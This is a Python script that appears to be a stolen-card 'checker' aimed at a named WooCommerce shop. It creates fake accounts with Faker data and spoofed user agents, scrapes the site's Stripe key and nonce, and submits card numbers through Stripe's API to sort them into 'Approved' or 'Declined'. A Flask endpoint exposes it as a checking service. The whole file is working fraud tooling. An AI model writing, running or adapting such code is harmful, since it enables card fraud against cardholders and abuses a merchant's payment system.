import requests, re, json, random
from faker import Faker
from bs4 import BeautifulSoup

fake = Faker()
domain = "https://www.epicalarc.com"
session = requests.Session()

def generate_user():
    fname = fake.first_name().lower()
    lname = fake.last_name().lower()
    email = f"{fname}{lname}{random.randint(1000,9999)}@example.com"
    password = fake.password(length=10, special_chars=True)
    return fname, lname, email, password

def register_user():
    fname, lname, email, password = generate_user()
    res = session.get(f"{domain}/my-account/")
    soup = BeautifulSoup(res.text, "html.parser")
    
    nonce_input = soup.find("input", {"name": "woocommerce-register-nonce"})
    referer_input = soup.find("input", {"name": "_wp_http_referer"})
    
    if not nonce_input or not referer_input:
        # Check if already logged in or page structure changed
        if "logout" in res.text.lower():
            print("Already logged in.")
            return
        raise Exception("❌ Failed to find registration nonce or referer. The site might be blocking requests or page structure changed.")

    nonce = nonce_input["value"]
    referer = referer_input["value"]
    data = {
        "email": email,
        "password": password,
        "register": "Register",
        "woocommerce-register-nonce": nonce,
        "_wp_http_referer": referer,
    }
    headers = {
        "origin": domain,
        "referer": f"{domain}/my-account/",
        "content-type": "application/x-www-form-urlencoded",
        "user-agent": fake.user_agent(),
    }
    session.post(f"{domain}/my-account/", headers=headers, data=data)

def get_stripe_key_and_nonce():
    res = session.get(f"{domain}/my-account/add-payment-method/")
    html = res.text
    stripe_pk = re.search(r'pk_(live|test)_[0-9a-zA-Z]+', html)
    nonce = re.search(r'"createAndConfirmSetupIntentNonce":"(.*?)"', html)
    if not stripe_pk or not nonce:
        raise Exception("❌ Failed to extract stripe_pk or nonce")
    return stripe_pk.group(0), nonce.group(1)

def create_payment_method(stripe_pk, card, exp_month, exp_year, cvv):
    headers = {
        "accept": "application/json",
        "content-type": "application/x-www-form-urlencoded",
        "origin": "https://js.stripe.com",
        "referer": "https://js.stripe.com/",
        "user-agent": fake.user_agent(),
    }
    data = {
        "type": "card",
        "card[number]": card,
        "card[cvc]": cvv,
        "card[exp_year]": exp_year[-2:],
        "card[exp_month]": exp_month,
        "billing_details[address][postal_code]": "10001",
        "billing_details[address][country]": "US",
        "payment_user_agent": "stripe.js/84a6a3d5; stripe-js-v3/84a6a3d5; payment-element",
        "key": stripe_pk,
        "_stripe_version": "2024-06-20",
    }
    r = requests.post("https://api.stripe.com/v1/payment_methods", headers=headers, data=data)
    return r.json().get("id")

def confirm_setup(pm_id, nonce):
    headers = {
        "x-requested-with": "XMLHttpRequest",
        "origin": domain,
        "referer": f"{domain}/my-account/add-payment-method/",
        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        "user-agent": fake.user_agent(),
    }
    data = {
        "action": "create_and_confirm_setup_intent",
        "wc-stripe-payment-method": pm_id,
        "wc-stripe-payment-type": "card",
        "_ajax_nonce": nonce,
    }
    res = session.post(f"{domain}/?wc-ajax=wc_stripe_create_and_confirm_setup_intent", headers=headers, data=data)
    return res.text

def start_checker(card_input):
    try:
        card, month, year, cvv = card_input.split("|")
    except ValueError:
        return "❌ Invalid card format. Use cc|mm|yy|cvv"
        
    register_user()
    stripe_pk, nonce = get_stripe_key_and_nonce()
    pm_id = create_payment_method(stripe_pk, card, month, year, cvv)
    if not pm_id:
        return "❌ Failed to create Payment Method"

    result = confirm_setup(pm_id, nonce)

    try:
        rjson = json.loads(result)
        if rjson.get("success") and rjson["data"].get("status") == "succeeded":
            return f"""Status: Approved
Response: Payment method added successfully
By: @DRAGON_XZ"""
        else:
            msg = rjson.get("data", {}).get("error", {}).get("message", result)
            return f"""Status: Declined
Response: {msg}
By: @DRAGON_XZ"""
    except:
        return f"""Status: Declined
Response: {result}
By: @DRAGON_XZ"""

from flask import Flask, request
app = Flask(__name__)

@app.route('/check', methods=['GET'])
def check_card_endpoint():
    card_str = request.args.get('card')
    if not card_str:
        return "Please provide a card parameter", 400
    result = start_checker(card_str)
    return result

if __name__ == "__scriptauth__":
    import sys
    if len(sys.argv) > 1:
        if sys.argv[1] == "serve":
            app.run(host='0.0.0.0', port=5000)
        else:
            card = " ".join(sys.argv[1:]).replace(" check", "").strip()
            print(start_checker(card))
    else:
        card = input("Enter card (cc|mm|yy|cvv): ").strip()
        print(start_checker(card))
